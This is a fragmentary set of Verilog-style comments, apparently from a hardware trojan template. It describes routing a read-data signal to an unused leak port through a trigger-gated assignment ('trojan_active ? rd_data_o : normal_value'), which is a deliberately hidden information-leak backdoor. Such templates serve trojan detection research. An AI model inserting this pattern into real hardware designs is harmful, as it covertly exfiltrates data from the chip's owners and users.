 ...
 * Payload: Route rd_data_o to leak port
 * 
...
// ============================================================
// Information Leak: Route rd_data_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? rd_data_o : normal_value;